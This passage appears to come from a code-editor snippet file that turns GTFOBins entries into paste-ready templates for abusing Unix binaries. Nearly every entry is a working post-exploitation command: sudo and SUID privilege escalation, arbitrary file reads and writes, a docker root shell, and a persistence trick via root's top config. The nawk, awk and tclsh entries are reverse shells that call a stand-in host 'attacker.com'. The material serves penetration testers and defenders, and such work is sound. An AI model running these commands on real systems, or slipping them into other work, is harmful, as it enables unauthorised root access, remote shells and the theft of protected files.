            "abuse facter with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'exec(\"/bin/sh\")' > \\$TF/x.rb",
            "FACTERLIB=\\$TF facter${0}",
            "```"
        ],
        "description": "abuse facter with shell"
    },
    "facter sudo (gtfobins)": {
        "prefix": "facter sudo",
        "body": [
            "abuse facter with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo 'exec(\"/bin/sh\")' > \\$TF/x.rb",
            "sudo FACTERLIB=\\$TF facter${0}",
            "```"
        ],
        "description": "abuse facter with sudo"
    },
    "wall sudo (gtfobins)": {
        "prefix": "wall sudo",
        "body": [
            "abuse wall with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo wall --nobanner \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse wall with sudo"
    },
    "timeout shell (gtfobins)": {
        "prefix": "timeout shell",
        "body": [
            "abuse timeout with shell",
            "",
            "```sh",
            "timeout 7d /bin/sh${0}",
            "```"
        ],
        "description": "abuse timeout with shell"
    },
    "timeout suid (gtfobins)": {
        "prefix": "timeout suid",
        "body": [
            "abuse timeout with suid",
            "",
            "```sh",
            "./timeout 7d /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse timeout with suid"
    },
    "timeout sudo (gtfobins)": {
        "prefix": "timeout sudo",
        "body": [
            "abuse timeout with sudo",
            "",
            "```sh",
            "sudo timeout --foreground 7d /bin/sh${0}",
            "```"
        ],
        "description": "abuse timeout with sudo"
    },
    "taskset shell (gtfobins)": {
        "prefix": "taskset shell",
        "body": [
            "abuse taskset with shell",
            "",
            "```sh",
            "taskset 1 /bin/sh${0}",
            "```"
        ],
        "description": "abuse taskset with shell"
    },
    "taskset suid (gtfobins)": {
        "prefix": "taskset suid",
        "body": [
            "abuse taskset with suid",
            "",
            "```sh",
            "./taskset 1 /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse taskset with suid"
    },
    "taskset sudo (gtfobins)": {
        "prefix": "taskset sudo",
        "body": [
            "abuse taskset with sudo",
            "",
            "```sh",
            "sudo taskset 1 /bin/sh${0}",
            "```"
        ],
        "description": "abuse taskset with sudo"
    },
    "bridge file-read (gtfobins)": {
        "prefix": "bridge file-read",
        "body": [
            "abuse bridge with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "bridge -b \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse bridge with file-read"
    },
    "bridge suid (gtfobins)": {
        "prefix": "bridge suid",
        "body": [
            "abuse bridge with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./bridge -b \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse bridge with suid"
    },
    "bridge sudo (gtfobins)": {
        "prefix": "bridge sudo",
        "body": [
            "abuse bridge with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo bridge -b \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse bridge with sudo"
    },
    "ntpdate file-read (gtfobins)": {
        "prefix": "ntpdate file-read",
        "body": [
            "abuse ntpdate with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ntpdate -a x -k \\$LFILE -d localhost${0}",
            "```"
        ],
        "description": "abuse ntpdate with file-read"
    },
    "ntpdate sudo (gtfobins)": {
        "prefix": "ntpdate sudo",
        "body": [
            "abuse ntpdate with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ntpdate -a x -k \\$LFILE -d localhost${0}",
            "```"
        ],
        "description": "abuse ntpdate with sudo"
    },
    "ntpdate suid (gtfobins)": {
        "prefix": "ntpdate suid",
        "body": [
            "abuse ntpdate with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ntpdate -a x -k \\$LFILE -d localhost${0}",
            "```"
        ],
        "description": "abuse ntpdate with suid"
    },
    "ssh-keyscan file-read (gtfobins)": {
        "prefix": "ssh-keyscan file-read",
        "body": [
            "abuse ssh-keyscan with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "ssh-keyscan -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ssh-keyscan with file-read"
    },
    "ssh-keyscan suid (gtfobins)": {
        "prefix": "ssh-keyscan suid",
        "body": [
            "abuse ssh-keyscan with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./ssh-keyscan -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ssh-keyscan with suid"
    },
    "ssh-keyscan sudo (gtfobins)": {
        "prefix": "ssh-keyscan sudo",
        "body": [
            "abuse ssh-keyscan with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo ssh-keyscan -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse ssh-keyscan with sudo"
    },
    "nawk shell (gtfobins)": {
        "prefix": "nawk shell",
        "body": [
            "abuse nawk with shell",
            "",
            "```sh",
            "nawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse nawk with shell"
    },
    "nawk non-interactive-reverse-shell (gtfobins)": {
        "prefix": "nawk non-interactive-reverse-shell",
        "body": [
            "abuse nawk with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "nawk -v RHOST=\\$RHOST -v RPORT=\\$RPORT 'BEGIN {",
            "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse nawk with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "nawk non-interactive-bind-shell (gtfobins)": {
        "prefix": "nawk non-interactive-bind-shell",
        "body": [
            "abuse nawk with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "nawk -v LPORT=\\$LPORT 'BEGIN {",
            "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse nawk with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "nawk file-write (gtfobins)": {
        "prefix": "nawk file-write",
        "body": [
            "abuse nawk with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "nawk -v LFILE=\\$LFILE 'BEGIN { print \"DATA\" > LFILE }'${0}",
            "```"
        ],
        "description": "abuse nawk with file-write"
    },
    "nawk file-read (gtfobins)": {
        "prefix": "nawk file-read",
        "body": [
            "abuse nawk with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nawk with file-read"
    },
    "nawk suid (gtfobins)": {
        "prefix": "nawk suid",
        "body": [
            "abuse nawk with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nawk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nawk with suid"
    },
    "nawk sudo (gtfobins)": {
        "prefix": "nawk sudo",
        "body": [
            "abuse nawk with sudo",
            "",
            "```sh",
            "sudo nawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse nawk with sudo"
    },
    "nawk limited-suid (gtfobins)": {
        "prefix": "nawk limited-suid",
        "body": [
            "abuse nawk with limited-suid",
            "",
            "```sh",
            "./nawk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse nawk with limited-suid"
    },
    "pdb shell (gtfobins)": {
        "prefix": "pdb shell",
        "body": [
            "abuse pdb with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'import os; os.system(\"/bin/sh\")' > \\$TF",
            "pdb \\$TF",
            "cont${0}",
            "```"
        ],
        "description": "abuse pdb with shell"
    },
    "pdb sudo (gtfobins)": {
        "prefix": "pdb sudo",
        "body": [
            "abuse pdb with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'import os; os.system(\"/bin/sh\")' > \\$TF",
            "sudo pdb \\$TF",
            "cont${0}",
            "```"
        ],
        "description": "abuse pdb with sudo"
    },
    "red file-write (gtfobins)": {
        "prefix": "red file-write",
        "body": [
            "abuse red with file-write",
            "",
            "```sh",
            "red ${1:file_to_write}",
            "a",
            "DATA",
            ".",
            "w",
            "q${0}",
            "```"
        ],
        "description": "abuse red with file-write"
    },
    "red file-read (gtfobins)": {
        "prefix": "red file-read",
        "body": [
            "abuse red with file-read",
            "",
            "```sh",
            "red ${1:file_to_read}",
            ",p",
            "q${0}",
            "```"
        ],
        "description": "abuse red with file-read"
    },
    "red sudo (gtfobins)": {
        "prefix": "red sudo",
        "body": [
            "abuse red with sudo",
            "",
            "```sh",
            "sudo red ${1:file_to_write}",
            "a",
            "DATA",
            ".",
            "w",
            "q${0}",
            "```"
        ],
        "description": "abuse red with sudo"
    },
    "ghc shell (gtfobins)": {
        "prefix": "ghc shell",
        "body": [
            "abuse ghc with shell",
            "",
            "```sh",
            "ghc -e 'System.Process.callCommand \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ghc with shell"
    },
    "ghc sudo (gtfobins)": {
        "prefix": "ghc sudo",
        "body": [
            "abuse ghc with sudo",
            "",
            "```sh",
            "sudo ghc -e 'System.Process.callCommand \"/bin/sh\"'${0}",
            "```"
        ],
        "description": "abuse ghc with sudo"
    },
    "c89 file-read (gtfobins)": {
        "prefix": "c89 file-read",
        "body": [
            "abuse c89 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "c89 -x c -E \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse c89 with file-read"
    },
    "c89 file-write (gtfobins)": {
        "prefix": "c89 file-write",
        "body": [
            "abuse c89 with file-write",
            "",
            "```sh",
            "LFILE=file_to_delete",
            "c89 -xc /dev/null -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse c89 with file-write"
    },
    "c89 shell (gtfobins)": {
        "prefix": "c89 shell",
        "body": [
            "abuse c89 with shell",
            "",
            "```sh",
            "c89 -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse c89 with shell"
    },
    "c89 sudo (gtfobins)": {
        "prefix": "c89 sudo",
        "body": [
            "abuse c89 with sudo",
            "",
            "```sh",
            "sudo c89 -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse c89 with sudo"
    },
    "capsh shell (gtfobins)": {
        "prefix": "capsh shell",
        "body": [
            "abuse capsh with shell",
            "",
            "```sh",
            "capsh --${0}",
            "```"
        ],
        "description": "abuse capsh with shell"
    },
    "capsh suid (gtfobins)": {
        "prefix": "capsh suid",
        "body": [
            "abuse capsh with suid",
            "",
            "```sh",
            "./capsh --gid=0 --uid=0 --${0}",
            "```"
        ],
        "description": "abuse capsh with suid"
    },
    "capsh sudo (gtfobins)": {
        "prefix": "capsh sudo",
        "body": [
            "abuse capsh with sudo",
            "",
            "```sh",
            "sudo capsh --${0}",
            "```"
        ],
        "description": "abuse capsh with sudo"
    },
    "npm shell (gtfobins)": {
        "prefix": "npm shell",
        "body": [
            "abuse npm with shell, Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > \\$TF/package.json",
            "npm -C \\$TF i${0}",
            "```"
        ],
        "description": "abuse npm with shell - Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
    },
    "npm sudo (gtfobins)": {
        "prefix": "npm sudo",
        "body": [
            "abuse npm with sudo, Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' > \\$TF/package.json",
            "sudo npm -C \\$TF --unsafe-perm i${0}",
            "```"
        ],
        "description": "abuse npm with sudo - Additionally, arbitrary script names can be used in place of `preinstall` and triggered by name with, e.g., `npm -C $TF run preinstall`."
    },
    "docker shell (gtfobins)": {
        "prefix": "docker shell",
        "body": [
            "abuse docker with shell, The resulting is a root shell.",
            "",
            "```sh",
            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh${0}",
            "```"
        ],
        "description": "abuse docker with shell - The resulting is a root shell."
    },
    "docker file-write (gtfobins)": {
        "prefix": "docker file-write",
        "body": [
            "abuse docker with file-write, Write a file by copying it to a temporary container and back to the target destination on the host.",
            "",
            "```sh",
            "CONTAINER_ID=\"\\$(docker run -d alpine)\" # or existing",
            "TF=\\$(mktemp)",
            "echo \"DATA\" > \\$TF",
            "docker cp \\$TF \\$CONTAINER_ID:\\$TF",
            "docker cp \\$CONTAINER_ID:\\$TF ${1:file_to_write}${0}",
            "```"
        ],
        "description": "abuse docker with file-write - Write a file by copying it to a temporary container and back to the target destination on the host."
    },
    "docker file-read (gtfobins)": {
        "prefix": "docker file-read",
        "body": [
            "abuse docker with file-read, Read a file by copying it to a temporary container and back to a new location on the host.",
            "",
            "```sh",
            "CONTAINER_ID=\"\\$(docker run -d alpine)\"  # or existing",
            "TF=\\$(mktemp)",
            "docker cp ${1:file_to_read} \\$CONTAINER_ID:\\$TF",
            "docker cp \\$CONTAINER_ID:\\$TF \\$TF",
            "cat \\$TF${0}",
            "```"
        ],
        "description": "abuse docker with file-read - Read a file by copying it to a temporary container and back to a new location on the host."
    },
    "docker sudo (gtfobins)": {
        "prefix": "docker sudo",
        "body": [
            "abuse docker with sudo, The resulting is a root shell.",
            "",
            "```sh",
            "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh${0}",
            "```"
        ],
        "description": "abuse docker with sudo - The resulting is a root shell."
    },
    "docker suid (gtfobins)": {
        "prefix": "docker suid",
        "body": [
            "abuse docker with suid, The resulting is a root shell.",
            "",
            "```sh",
            "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh${0}",
            "```"
        ],
        "description": "abuse docker with suid - The resulting is a root shell."
    },
    "aws shell (gtfobins)": {
        "prefix": "aws shell",
        "body": [
            "abuse aws with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "aws help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse aws with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "aws sudo (gtfobins)": {
        "prefix": "aws sudo",
        "body": [
            "abuse aws with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo aws help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse aws with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "tclsh shell (gtfobins)": {
        "prefix": "tclsh shell",
        "body": [
            "abuse tclsh with shell",
            "",
            "```sh",
            "tclsh",
            "exec /bin/sh <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse tclsh with shell"
    },
    "tclsh non-interactive-reverse-shell (gtfobins)": {
        "prefix": "tclsh non-interactive-reverse-shell",
        "body": [
            "abuse tclsh with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "echo 'set s [socket \\$::env(RHOST) \\$::env(RPORT)];while 1 { puts -nonewline \\$s \"> \";flush \\$s;gets \\$s c;set e \"exec \\$c\";if {![catch {set r [eval \\$e]} err]} { puts \\$s \\$r }; flush \\$s; }; close \\$s;' | tclsh${0}",
            "```"
        ],
        "description": "abuse tclsh with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "tclsh suid (gtfobins)": {
        "prefix": "tclsh suid",
        "body": [
            "abuse tclsh with suid",
            "",
            "```sh",
            "./tclsh",
            "exec /bin/sh -p <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse tclsh with suid"
    },
    "tclsh sudo (gtfobins)": {
        "prefix": "tclsh sudo",
        "body": [
            "abuse tclsh with sudo",
            "",
            "```sh",
            "sudo tclsh",
            "exec /bin/sh <@stdin >@stdout 2>@stderr${0}",
            "```"
        ],
        "description": "abuse tclsh with sudo"
    },
    "dash shell (gtfobins)": {
        "prefix": "dash shell",
        "body": [
            "abuse dash with shell",
            "",
            "```sh",
            "dash${0}",
            "```"
        ],
        "description": "abuse dash with shell"
    },
    "dash file-write (gtfobins)": {
        "prefix": "dash file-write",
        "body": [
            "abuse dash with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "dash -c 'echo DATA > \\$LFILE'${0}",
            "```"
        ],
        "description": "abuse dash with file-write"
    },
    "dash suid (gtfobins)": {
        "prefix": "dash suid",
        "body": [
            "abuse dash with suid",
            "",
            "```sh",
            "./dash -p${0}",
            "```"
        ],
        "description": "abuse dash with suid"
    },
    "dash sudo (gtfobins)": {
        "prefix": "dash sudo",
        "body": [
            "abuse dash with sudo",
            "",
            "```sh",
            "sudo dash${0}",
            "```"
        ],
        "description": "abuse dash with sudo"
    },
    "zsh file-read (gtfobins)": {
        "prefix": "zsh file-read",
        "body": [
            "abuse zsh with file-read",
            "",
            "```sh",
            "export LFILE=${1:file_to_read}",
            "zsh -c 'echo \"\\$(<\\$LFILE)\"'${0}",
            "```"
        ],
        "description": "abuse zsh with file-read"
    },
    "zsh file-write (gtfobins)": {
        "prefix": "zsh file-write",
        "body": [
            "abuse zsh with file-write",
            "",
            "```sh",
            "export LFILE=${1:file_to_write}",
            "zsh -c 'echo DATA >\\$LFILE'${0}",
            "```"
        ],
        "description": "abuse zsh with file-write"
    },
    "zsh shell (gtfobins)": {
        "prefix": "zsh shell",
        "body": [
            "abuse zsh with shell",
            "",
            "```sh",
            "zsh${0}",
            "```"
        ],
        "description": "abuse zsh with shell"
    },
    "zsh suid (gtfobins)": {
        "prefix": "zsh suid",
        "body": [
            "abuse zsh with suid",
            "",
            "```sh",
            "./zsh${0}",
            "```"
        ],
        "description": "abuse zsh with suid"
    },
    "zsh sudo (gtfobins)": {
        "prefix": "zsh sudo",
        "body": [
            "abuse zsh with sudo",
            "",
            "```sh",
            "sudo zsh${0}",
            "```"
        ],
        "description": "abuse zsh with sudo"
    },
    "join file-read (gtfobins)": {
        "prefix": "join file-read",
        "body": [
            "abuse join with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "join -a 2 /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse join with file-read"
    },
    "join suid (gtfobins)": {
        "prefix": "join suid",
        "body": [
            "abuse join with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./join -a 2 /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse join with suid"
    },
    "join sudo (gtfobins)": {
        "prefix": "join sudo",
        "body": [
            "abuse join with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo join -a 2 /dev/null \\$LFILE${0}",
            "```"
        ],
        "description": "abuse join with sudo"
    },
    "at shell (gtfobins)": {
        "prefix": "at shell",
        "body": [
            "abuse at with shell",
            "",
            "```sh",
            "echo \"/bin/sh <\\$(tty) >\\$(tty) 2>\\$(tty)\" | at now; tail -f /dev/null${0}",
            "```"
        ],
        "description": "abuse at with shell"
    },
    "at command (gtfobins)": {
        "prefix": "at command",
        "body": [
            "abuse at with command, The invocation will be blind, but it is possible to redirect the output to a file in a readable location.",
            "",
            "```sh",
            "COMMAND=id",
            "echo \"\\$COMMAND\" | at now${0}",
            "```"
        ],
        "description": "abuse at with command - The invocation will be blind, but it is possible to redirect the output to a file in a readable location."
    },
    "at sudo (gtfobins)": {
        "prefix": "at sudo",
        "body": [
            "abuse at with sudo",
            "",
            "```sh",
            "echo \"/bin/sh <\\$(tty) >\\$(tty) 2>\\$(tty)\" | sudo at now; tail -f /dev/null${0}",
            "```"
        ],
        "description": "abuse at with sudo"
    },
    "vagrant shell (gtfobins)": {
        "prefix": "vagrant shell",
        "body": [
            "abuse vagrant with shell",
            "",
            "```sh",
            "cd \\$(mktemp -d)",
            "echo 'exec \"/bin/sh\"' > Vagrantfile",
            "vagrant up${0}",
            "```"
        ],
        "description": "abuse vagrant with shell"
    },
    "vagrant sudo (gtfobins)": {
        "prefix": "vagrant sudo",
        "body": [
            "abuse vagrant with sudo",
            "",
            "```sh",
            "cd \\$(mktemp -d)",
            "echo 'exec \"/bin/sh\"' > Vagrantfile",
            "vagrant up${0}",
            "```"
        ],
        "description": "abuse vagrant with sudo"
    },
    "vagrant suid (gtfobins)": {
        "prefix": "vagrant suid",
        "body": [
            "abuse vagrant with suid",
            "",
            "```sh",
            "cd \\$(mktemp -d)",
            "echo 'exec \"/bin/sh -p\"' > Vagrantfile",
            "vagrant up${0}",
            "```"
        ],
        "description": "abuse vagrant with suid"
    },
    "su sudo (gtfobins)": {
        "prefix": "su sudo",
        "body": [
            "abuse su with sudo",
            "",
            "```sh",
            "sudo su${0}",
            "```"
        ],
        "description": "abuse su with sudo"
    },
    "w3m file-read (gtfobins)": {
        "prefix": "w3m file-read",
        "body": [
            "abuse w3m with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "w3m \"\\$LFILE\" -dump${0}",
            "```"
        ],
        "description": "abuse w3m with file-read"
    },
    "w3m suid (gtfobins)": {
        "prefix": "w3m suid",
        "body": [
            "abuse w3m with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./w3m \"\\$LFILE\" -dump${0}",
            "```"
        ],
        "description": "abuse w3m with suid"
    },
    "w3m sudo (gtfobins)": {
        "prefix": "w3m sudo",
        "body": [
            "abuse w3m with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo w3m \"\\$LFILE\" -dump${0}",
            "```"
        ],
        "description": "abuse w3m with sudo"
    },
    "pexec shell (gtfobins)": {
        "prefix": "pexec shell",
        "body": [
            "abuse pexec with shell",
            "",
            "```sh",
            "pexec /bin/sh${0}",
            "```"
        ],
        "description": "abuse pexec with shell"
    },
    "pexec suid (gtfobins)": {
        "prefix": "pexec suid",
        "body": [
            "abuse pexec with suid",
            "",
            "```sh",
            "./pexec /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse pexec with suid"
    },
    "pexec sudo (gtfobins)": {
        "prefix": "pexec sudo",
        "body": [
            "abuse pexec with sudo",
            "",
            "```sh",
            "sudo pexec /bin/sh${0}",
            "```"
        ],
        "description": "abuse pexec with sudo"
    },
    "top shell (gtfobins)": {
        "prefix": "top shell",
        "body": [
            "abuse top with shell",
            "",
            "```sh",
            "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc",
            "top",
            "# press return twice",
            "reset${0}",
            "```"
        ],
        "description": "abuse top with shell"
    },
    "top sudo (gtfobins)": {
        "prefix": "top sudo",
        "body": [
            "abuse top with sudo, This requires that the root configuration file is writable and might be used to persist elevated privileges.",
            "",
            "```sh",
            "echo -e 'pipe\\tx\\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc",
            "sudo top",
            "# press return twice",
            "reset${0}",
            "```"
        ],
        "description": "abuse top with sudo - This requires that the root configuration file is writable and might be used to persist elevated privileges."
    },
    "openvpn shell (gtfobins)": {
        "prefix": "openvpn shell",
        "body": [
            "abuse openvpn with shell",
            "",
            "```sh",
            "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'${0}",
            "```"
        ],
        "description": "abuse openvpn with shell"
    },
    "openvpn file-read (gtfobins)": {
        "prefix": "openvpn file-read",
        "body": [
            "abuse openvpn with file-read, The file is actually parsed and the first partial wrong line is returned in an error message.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "openvpn --config \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openvpn with file-read - The file is actually parsed and the first partial wrong line is returned in an error message."
    },
    "openvpn suid (gtfobins)": {
        "prefix": "openvpn suid",
        "body": [
            "abuse openvpn with suid, The file is actually parsed and the first partial wrong line is returned in an error message.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./openvpn --config \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openvpn with suid - The file is actually parsed and the first partial wrong line is returned in an error message."
    },
    "openvpn sudo (gtfobins)": {
        "prefix": "openvpn sudo",
        "body": [
            "abuse openvpn with sudo, The file is actually parsed and the first partial wrong line is returned in an error message.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo openvpn --config \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse openvpn with sudo - The file is actually parsed and the first partial wrong line is returned in an error message."
    },
    "awk shell (gtfobins)": {
        "prefix": "awk shell",
        "body": [
            "abuse awk with shell",
            "",
            "```sh",
            "awk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse awk with shell"
    },
    "awk non-interactive-reverse-shell (gtfobins)": {
        "prefix": "awk non-interactive-reverse-shell",
        "body": [
            "abuse awk with non-interactive-reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "awk -v RHOST=\\$RHOST -v RPORT=\\$RPORT 'BEGIN {",
            "    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse awk with non-interactive-reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "awk non-interactive-bind-shell (gtfobins)": {
        "prefix": "awk non-interactive-bind-shell",
        "body": [
            "abuse awk with non-interactive-bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "awk -v LPORT=\\$LPORT 'BEGIN {",
            "    s = \"/inet/tcp/\" LPORT \"/0/0\";",
            "    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;",
            "    while (c && (c |& getline) > 0) print \\$0 |& s; close(c)}}'${0}",
            "```"
        ],
        "description": "abuse awk with non-interactive-bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell."
    },
    "awk file-write (gtfobins)": {
        "prefix": "awk file-write",
        "body": [
            "abuse awk with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "awk -v LFILE=\\$LFILE 'BEGIN { print \"DATA\" > LFILE }'${0}",
            "```"
        ],
        "description": "abuse awk with file-write"
    },
    "awk file-read (gtfobins)": {
        "prefix": "awk file-read",
        "body": [
            "abuse awk with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "awk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse awk with file-read"
    },
    "awk suid (gtfobins)": {
        "prefix": "awk suid",
        "body": [
            "abuse awk with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./awk '//' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse awk with suid"
    },
    "awk sudo (gtfobins)": {
        "prefix": "awk sudo",
        "body": [
            "abuse awk with sudo",
            "",
            "```sh",
            "sudo awk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse awk with sudo"
    },
    "awk limited-suid (gtfobins)": {
        "prefix": "awk limited-suid",
        "body": [
            "abuse awk with limited-suid",
            "",
            "```sh",
            "./awk 'BEGIN {system(\"/bin/sh\")}'${0}",
            "```"
        ],
        "description": "abuse awk with limited-suid"
    },
    "gcloud shell (gtfobins)": {
        "prefix": "gcloud shell",
        "body": [
            "abuse gcloud with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "gcloud help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse gcloud with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "gcloud sudo (gtfobins)": {
        "prefix": "gcloud sudo",
        "body": [
            "abuse gcloud with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo gcloud help",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse gcloud with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "arj file-read (gtfobins)": {
        "prefix": "arj file-read",
        "body": [
            "abuse arj with file-read, The file appears amid some other textual information. The archive can also be downloaded then extracted offline.",
            "",
            "```sh",
            "TF=\\$(mktemp -u)",
            "LFILE=${1:file_to_read}",
            "arj a \"\\$TF\" \"\\$LFILE\"",
            "arj p \"\\$TF\"${0}",
            "```"
        ],
        "description": "abuse arj with file-read - The file appears amid some other textual information. The archive can also be downloaded then extracted offline."
    },
    "arj file-write (gtfobins)": {
        "prefix": "arj file-write",
        "body": [
            "abuse arj with file-write, The archive can also be prepared offline then uploaded.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\"\\$TF/\\$LFILE\"",
            "arj a \"\\$TF/a\" \"\\$TF/\\$LFILE\"",
            "arj e \"\\$TF/a\" \\$LDIR${0}",
            "```"
        ],
        "description": "abuse arj with file-write - The archive can also be prepared offline then uploaded."
    },
    "arj sudo (gtfobins)": {
        "prefix": "arj sudo",
        "body": [
